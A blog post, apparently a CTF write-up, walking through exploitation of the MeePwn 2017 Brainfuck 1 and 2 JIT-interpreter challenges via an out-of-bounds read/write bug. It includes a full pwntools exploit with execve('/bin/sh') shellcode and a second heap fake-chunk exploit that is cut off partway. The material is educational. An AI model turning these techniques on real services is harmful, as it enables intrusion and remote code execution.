@@ -1,0 +1,899 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,Pwnable,Python,heap,shellcode,MeePwn,brainfuck," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hacking Tube 2.0" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Category: Pwnable Both binaries are 64 bit ELF, No RELRO, No canary, PIE &amp;amp; NX enabled.">
+<meta name="keywords" content="CTF,Pwnable,Python,heap,shellcode,MeePwn,brainfuck">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MeePwn CTF 2017 -- Brainfuck 1 &amp; 2">
+<meta property="og:url" content="https://bruce30262.github.io/2017/07/16/MeePwn-CTF-2017-Brainfuck-1-2/index.html">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:description" content="Category: Pwnable Both binaries are 64 bit ELF, No RELRO, No canary, PIE &amp;amp; NX enabled.">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-01-03T15:08:05.611Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MeePwn CTF 2017 -- Brainfuck 1 &amp; 2">
+<meta name="twitter:description" content="Category: Pwnable Both binaries are 64 bit ELF, No RELRO, No canary, PIE &amp;amp; NX enabled.">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://bruce30262.github.io/2017/07/16/MeePwn-CTF-2017-Brainfuck-1-2/"/>
+
+
+
+
+
+  <title>MeePwn CTF 2017 -- Brainfuck 1 & 2 | Hacking Tube 2.0</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-100090256-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hacking Tube 2.0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Security and stuff.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://bruce30262.github.io/2017/07/16/MeePwn-CTF-2017-Brainfuck-1-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bruce Chen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hacking Tube 2.0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MeePwn CTF 2017 -- Brainfuck 1 & 2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-16T15:28:00+08:00">
+                2017-07-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/07/16/MeePwn-CTF-2017-Brainfuck-1-2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/07/16/MeePwn-CTF-2017-Brainfuck-1-2/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>views
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>Category:</strong> Pwnable</p>
+<p>Both binaries are 64 bit ELF, No RELRO, No canary, PIE &amp; NX enabled.  </p>
+<a id="more"></a>
+<h2 id="Brainfuck1"><a href="#Brainfuck1" class="headerlink" title="Brainfuck1"></a>Brainfuck1</h2><p>The program is a simple <a href="https://en.wikipedia.org/wiki/Brainfuck" target="_blank" rel="noopener">brainfuck</a> language interpreter: it read input ( brainfuck code ), translate the code to the corresponding x86 machine code and execute it.</p>
+<p>For example, if we input <code>+++++++++</code> ( 9 <code>+</code> ), the program will translate the code into the following machine code:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7ff5000:      push   rbp</span><br><span class="line">0x7ffff7ff5001:      mov    rbp,rsp</span><br><span class="line">0x7ffff7ff5004:      sub    rsp,0x20</span><br><span class="line">0x7ffff7ff5008:      mov    r14,rdi   ; r14 is the data pointer </span><br><span class="line">0x7ffff7ff500b:      add    BYTE PTR [r14],0x9  ; [r14] += 9 </span><br><span class="line">0x7ffff7ff500f:      add    rsp,0x20</span><br><span class="line">0x7ffff7ff5013:      pop    rbp</span><br><span class="line">0x7ffff7ff5014:      ret</span><br></pre></td></tr></table></figure>
+<p>The program has the following data structure:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bf_data</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *dp; <span class="comment">// data pointer</span></span><br><span class="line">    <span class="keyword">char</span> *sc_buf; <span class="comment">// machine code buffer</span></span><br><span class="line">    __int64 field_16 ; <span class="comment">// not sure about the usage</span></span><br><span class="line">    __int64 sc_pos;  <span class="comment">// machine code position</span></span><br><span class="line">    __int64 sc_size; <span class="comment">// machine code buffer size</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The <code>bf_data</code> is placed on the heap memory. It will treat <code>bf_data-&gt;dp</code> as the first parameter while executing the machine code.</p>
+<p>The vulnerability is quite simple: it did not have the boundary check for the data pointer increment/decrement. For example, it we input 1000 <code>&gt;</code> and a <code>,</code>, we can write a byte at <code>bf_data-&gt;dp + 1000</code>, thus we have an out-of-bound read/write vulnerability.</p>
+<p>Here’s the basic concept of how I exploit the service:</p>
+<ol>
+<li>Leak the machine code buffer address ( an mmap address with <code>rwx</code> permission )</li>
+<li>Place our shellcode on the mmap buffer</li>
+<li>Self-modified the machine code in <code>bf_data-&gt;sc_buf</code> so it will jump to our shellcode buffer and execute our shellcode.  </li>
+</ol>
+<p>First we use the OOB read to leak the machine code buffer address. After that, we use OOB write to overwrite <code>bf_data-&gt;dp</code>, making it point to our shellcode buffer, then use <code>&gt;</code> and <code>,</code> to write our shellcode to <code>bf_data-&gt;dp</code>.  </p>
+<p>Now because <code>bf_data-&gt;dp</code> is near to <code>bf_data-&gt;sc_buf</code>, so again we can use the OOB write to modify the content of <code>bf_data-&gt;sc_buf</code>, creating a <strong>self-modified machine code</strong> situation. I decided to modify the end of the machine code into:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, shellcode_buf_addr</span><br><span class="line">call rax</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><figcaption><span>exp_bf1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"139.59.244.42"</span></span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line">ELF_PATH = <span class="string">"./bf1"</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(s)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt;"</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(move, content)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> move &lt; <span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">"&lt;"</span> * abs(move)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"&gt;"</span> * abs(move)</span><br><span class="line"></span><br><span class="line">    payload += <span class="string">",&gt;"</span>*len(content)</span><br><span class="line">    </span><br><span class="line">    cmd(payload)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = <span class="string">"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># leak mmap address </span></span><br><span class="line">    payload = <span class="string">"&lt;"</span>*<span class="number">0x28</span> <span class="comment"># move to &amp;bf_data-&gt;sc_buf</span></span><br><span class="line">    payload += <span class="string">".&gt;"</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    cmd(payload)</span><br><span class="line">    sc_base = u64(r.recvuntil(<span class="string">"&gt;&gt;"</span>)[:<span class="number">8</span>:]) &gt;&gt; <span class="number">8</span></span><br><span class="line">    r.unrecv(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    log.success(<span class="string">"sc_base: "</span>+hex(sc_base))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># make size = 0x400 so it won't clear our shellcode</span></span><br><span class="line">    write(<span class="number">-0x10</span>, p64(<span class="number">0x400</span>))</span><br><span class="line">    <span class="comment"># change bf_data-&gt;dp = our shellcode buffer</span></span><br><span class="line">    write(<span class="number">-0x30</span>, p64(sc_base+<span class="number">0x800</span>))</span><br><span class="line">    <span class="comment"># write final shellcode to our shellcode buffer</span></span><br><span class="line">    write(<span class="number">0</span>, sc)</span><br><span class="line">    <span class="comment"># write to bf_data-&gt;sc_buf ( it will become a self-modified shellcode)</span></span><br><span class="line">    init_sc = asm(<span class="string">"mov rax, %s"</span> % hex(sc_base+<span class="number">0x800</span>))</span><br><span class="line">    init_sc += asm(<span class="string">"call rax"</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"init_sc"</span>, init_sc.encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"len:"</span>, len(init_sc)</span><br><span class="line">    write(<span class="number">-0x70d</span>, init_sc)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>MeePwnCTF{this_is_simple_challenge_:banana-dance:}</code></p>
+<h2 id="Brainfuck2"><a href="#Brainfuck2" class="headerlink" title="Brainfuck2"></a>Brainfuck2</h2><p>For Brainfuck2, the binary is basically the same as Brainfuck1, except it has the following exectuting process:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">BrainFuckVM *__fastcall BrainFuckVM::run(BrainFuckVM *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *sc_buf; <span class="comment">// ST20_8@1</span></span><br><span class="line">    BrainFuckVM *v2; <span class="comment">// ST18_8@1</span></span><br><span class="line">    BrainFuckVM *result; <span class="comment">// rax@3</span></span><br><span class="line"></span><br><span class="line">    sc_buf = <span class="keyword">this</span>-&gt;sc_buf;</span><br><span class="line">    v2 = <span class="keyword">this</span>;</span><br><span class="line">    <span class="comment">/* allocate + memset bf_data-&gt;dp */</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;dp = (<span class="keyword">char</span> *)<span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="keyword">this</span>-&gt;dp, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="comment">/* set the sc_buf's permission to r-x*/</span></span><br><span class="line">    mprotect(v2-&gt;sc_buf, v2-&gt;sc_size, <span class="number">5</span>); </span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *))sc_buf)(<span class="keyword">this</span>-&gt;bf_mem);</span><br><span class="line">    <span class="comment">/* set the sc_buf's permission back to rw-*/</span></span><br><span class="line">    mprotect(v2-&gt;sc_buf, v2-&gt;sc_size, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">this</span>-&gt;sc_pos = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">memset</span>(v2-&gt;sc_buf, <span class="number">0</span>, v2-&gt;sc_size);</span><br><span class="line">    <span class="comment">/* free bf_data-&gt;dp */</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">this</span>-&gt;dp )</span><br><span class="line">      <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">this</span>-&gt;dp)</span></span>;</span><br><span class="line">    result = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">this</span>-&gt;dp = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Several changes are made:</p>
+<ol>
+<li>We can hardly control the address of <code>bf_data-&gt;dp</code>, it will only be allocated before the execution of the machine code.</li>
+<li>The <code>bf_data-&gt;sc_buf</code>‘s permission is changed to <code>r-x</code>, so this time the self-modified trick won’t work.</li>
+</ol>
+<p>Luckily, the vulnerability is still there – we can still use the OOB read/write to do some evil stuff ;)  </p>
+<p>First of all, we can still use the OOB write to modify the <code>bf_data-&gt;dp</code> pointer, and because later the program will free this pointer, this means that <strong>we can control the address that is being freed</strong>. </p>
+<p>After program free the <code>bf_data-&gt;dp</code> pointer, the first memory allocation will be the command line buffer, which chunk size is <code>0x110</code>. If we freed a buffer with address <code>addr</code> and size = 0x110, later when the program allocate a memory for the command line buffer, it will take <code>addr</code> as the new buffer, <strong>and so we can control the content of <code>addr</code></strong> by input our command ( the brainfuck code ).</p>
+<p>Based on the above concept, I decided to do the following:</p>
+<ol>
+<li>Use OOB read to leak the heap address</li>
+<li>Use OOB write to create fake chunk at <code>bf_data - some_offset</code></li>
+<li>Use OOB write to overwrite <code>bf_data-&gt;dp</code>, making it point to our fake chunk</li>
+</ol>
+<p>By doing this, the program will eventually allocate <code>bf_data - some_offset</code> to the command line buffer, <strong>and thus making us able to control <code>bf_data</code> by input the next brainfuck code</strong>.</p>
+<p>Since now we can control the structure of <code>bf_data</code>, all we need to do is to overwrite the <code>bf_data-&gt;sc_buf</code>, making it point to our shellcode buffer, so we can execute our own shellcode and capture the flag. Before we overwrite <code>bf_data-&gt;sc_buf</code>, there’re several things we’ll need to be aware of:</p>
+<ol>
+<li>We’ll have to write our shellcode in our shellcode buffer first. Since we can’t control <code>bf_data-&gt;dp</code>, I decided to use the <code>[&gt;.,]</code> brainfuck code to write my shellcode. The brainfuck code will keep reading our input until it encounters a null byte ( thanks to wikipedia ). Our shellcode will be placed on <code>bf_data-&gt;dp + some_offset</code>.</li>
+<li>Notice the program will modify the first several bytes of our shellcode, so it’s better to pad some <code>NOP</code> at the beginning of our shellcode.</li>
+<li>To avoid the program changing our shellcode into the <code>ret</code> instruction, we’ll have to overwrite the <code>bf_data-&gt;sc_pos</code> data as well ( because the program will place the <code>ret</code> machine code at <code>bf_data-&gt;sc_buf + bf_data-&gt;sc_pos</code> ). Overwrite this data to a large number, so the <code>ret</code> instruction won’t effect our shellcode.</li>
+</ol>
+<p>Final exploit script:<br><figure class="highlight python"><figcaption><span>exp_bf2.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"139.59.244.42"</span></span><br><span class="line">PORT = <span class="number">31338</span></span><br><span class="line">ELF_PATH = <span class="string">"./bf2"</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(s)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt;"</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(move, content, scmd=None, scontent=None)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> move &lt; <span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">"&lt;"</span> * abs(move)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"&gt;"</span> * abs(move)</span><br><span class="line"></span><br><span class="line">    payload += <span class="string">",&gt;"</span>*len(content)</span><br><span class="line">    <span class="keyword">if</span> scmd:</span><br><span class="line">        payload += scmd</span><br><span class="line">        content += scontent</span><br><span class="line">    payload = payload.ljust(<span class="number">512</span>, <span class="string">"B"</span>)</span><br><span class="line">    </span><br><span class="line">    cmd(payload)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(move, cnt)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> move &lt; <span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">"&lt;"</span> * abs(move)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"&gt;"</span> * abs(move)</span><br><span class="line"></span><br><span class="line">    payload += <span class="string">".&gt;"</span>*cnt</span><br><span class="line">    payload = payload.ljust(<span class="number">512</span>, <span class="string">"B"</span>)</span><br><span class="line">    </span><br><span class="line">    cmd(payload)</span><br><span class="line">    r.recv(<span class="number">1024</span>) <span class="comment"># ¯\_(ツ)_/¯ </span></span><br><span class="line">    ret = r.recvuntil(<span class="string">"&gt;&gt;"</span>)[:<span class="number">-2</span>:]</span><br><span class="line">    r.unrecv(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">sc = <span class="string">"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        r = process(ELF_PATH)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(HOST, PORT)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># make unsortbin + libc address</span></span><br><span class="line">    cmd(<span class="string">"A"</span>*<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    libc.address = u64(leak(<span class="number">0x110</span>, <span class="number">8</span>)) - <span class="number">0x3c3b78</span> <span class="comment"># local</span></span><br><span class="line">    log.success(<span class="string">"libc base: "</span>+hex(libc.address))</span><br><span class="line">    heap_addr = u64(leak(<span class="number">-0x30</span>, <span class="number">8</span>))</span><br><span class="line">    log.success(<span class="string">"heap_addr: "</span>+hex(heap_addr))</span><br><span class="line">    fake_chunk = heap_addr - <span class="number">0x70</span></span><br><span class="line">    log.success(<span class="string">"fake_chunk: "</span>+hex(fake_chunk))</span><br><span class="line">    sc_buf = heap_addr + <span class="number">0x3b0</span><span class="comment"># our shellcode buffer</span></span><br><span class="line">    log.success(<span class="string">"sc_buf: "</span>+hex(sc_buf))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk</span></span><br><span class="line">    write(<span class="number">-0x78</span>, p64(<span 